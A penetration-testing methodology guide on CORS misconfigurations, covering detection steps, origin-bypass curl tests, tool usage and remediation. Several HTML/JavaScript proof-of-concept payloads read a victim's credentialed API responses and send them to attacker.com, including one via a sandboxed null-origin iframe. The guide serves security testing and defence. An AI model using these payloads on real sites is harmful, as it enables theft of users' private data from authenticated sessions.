# CORS Misconfiguration Testing

## Overview
Cross-Origin Resource Sharing (CORS) misconfigurations allow attackers to make cross-origin requests from malicious websites to read sensitive data from vulnerable applications. When CORS policies are overly permissive, attackers can steal user data, session tokens, and API responses by luring victims to attacker-controlled pages.

## Classification
- **CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-346 (Origin Validation Error)
- **OWASP:** A01:2021 - Broken Access Control, A05:2021 - Security Misconfiguration
- **CVSS Base:** 5.3 - 8.6

## Detection Methodology

### 1. Identify CORS-Enabled Endpoints
Look for responses containing CORS headers:
```
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
Access-Control-Allow-Methods
Access-Control-Allow-Headers
Access-Control-Expose-Headers
Access-Control-Max-Age
```

Target endpoints that return sensitive data:
- User profile APIs
- Account details / settings
- Financial data or transaction history
- API keys, tokens, secrets
- Internal configuration endpoints

### 2. Origin Reflection Testing
Send requests with controlled `Origin` headers and observe responses:

```bash
# Test arbitrary origin reflection
curl -s -D- -H "Origin: https://evil.com" https://target.com/api/user | grep -i "access-control"

# Expected vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

### 3. Null Origin Attack
```bash
# Test null origin acceptance
curl -s -D- -H "Origin: null" https://target.com/api/user | grep -i "access-control"

# Null origin PoC (sandboxed iframe triggers null origin)
```
```html
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,
<script>
  fetch('https://target.com/api/user', {credentials: 'include'})
    .then(r => r.json())
    .then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))));
</script>">
</iframe>
```

### 4. Subdomain Wildcard / Prefix/Suffix Bypass
```bash
# Test if subdomains are trusted (risky if any subdomain has XSS)
curl -s -D- -H "Origin: https://evil.target.com" https://target.com/api/user

# Test prefix matching bypass
curl -s -D- -H "Origin: https://target.com.evil.com" https://target.com/api/user

# Test suffix matching bypass
curl -s -D- -H "Origin: https://eviltarget.com" https://target.com/api/user

# Test with different protocols
curl -s -D- -H "Origin: http://target.com" https://target.com/api/user
```

### 5. Credentials with Wildcard
```bash
# Check for wildcard with credentials (browser will block, but indicates misconfiguration)
curl -s -D- -H "Origin: https://anything.com" https://target.com/api/data

# Vulnerable response:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# (Browsers reject this, but non-browser clients can exploit it)
```

### 6. Special Characters and Encoding Bypass
```bash
# Underscore variant
curl -s -D- -H "Origin: https://target_com.evil.com" https://target.com/api/user

# Backslash trick (IE/Edge legacy)
curl -s -D- -H "Origin: https://target.com%60.evil.com" https://target.com/api/user

# Null byte injection
curl -s -D- -H "Origin: https://evil.com%00.target.com" https://target.com/api/user
```

### 7. Preflight Request Analysis
```bash
# Send OPTIONS preflight
curl -s -D- -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: X-Custom-Header" \
  https://target.com/api/user
```

## Exploitation PoC

### Data Theft via Reflected Origin
```html
<html>
<body>
<h1>CORS PoC - Data Exfiltration</h1>
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    // Send stolen data to attacker
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'https://attacker.com/collect');
    exfil.send(req.responseText);
    document.getElementById('result').innerText = req.responseText;
  };
  req.open('GET', 'https://target.com/api/user/profile', true);
  req.withCredentials = true;
  req.send();
</script>
<pre id="result"></pre>
</body>
</html>
```

### Fetch API PoC
```html
<script>
fetch('https://target.com/api/sensitive-data', {
  credentials: 'include'
})
.then(response => response.text())
.then(data => {
  // Exfiltrate
  navigator.sendBeacon('https://attacker.com/log', data);
});
</script>
```

## Tool Usage
```bash
# CORScanner - automated CORS misconfiguration scanner
python3 cors_scan.py -u https://target.com -t 10

# Nuclei CORS templates
nuclei -u https://target.com -t http/misconfiguration/cors/ -batch

# Manual bulk testing with curl
for origin in "https://evil.com" "null" "https://evil.target.com" \
  "https://target.com.evil.com" "http://target.com"; do
  echo "--- Testing Origin: $origin ---"
  curl -s -D- -o /dev/null -H "Origin: $origin" https://target.com/api/user \
    | grep -i "access-control"
done

# Burp Suite
# 1. Send request to Repeater
# 2. Add Origin: https://evil.com header
# 3. Check response for reflected origin + credentials header
```

## Remediation
1. **Whitelist specific origins** -- never reflect arbitrary Origin values
2. **Avoid null origin** -- do not include `null` in allowed origins
3. **No credentials with wildcard** -- `Access-Control-Allow-Credentials: true` requires a specific origin, not `*`
4. **Validate origin strictly** -- use exact string matching against a server-side allowlist
5. **Minimize exposed headers** -- only expose necessary headers via `Access-Control-Expose-Headers`
6. **Restrict methods** -- limit `Access-Control-Allow-Methods` to required HTTP methods
7. **Avoid trusting all subdomains** -- an XSS on any subdomain breaks the entire CORS policy
8. **Set short preflight cache** -- use conservative `Access-Control-Max-Age`

## Evidence Collection
- Request with attacker-controlled Origin and full response headers
- `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` values
- Working PoC HTML demonstrating cross-origin data read
- Sensitive data accessible via the misconfiguration
- List of all endpoints with permissive CORS policies
- Impact assessment (data types exposed, authentication state)
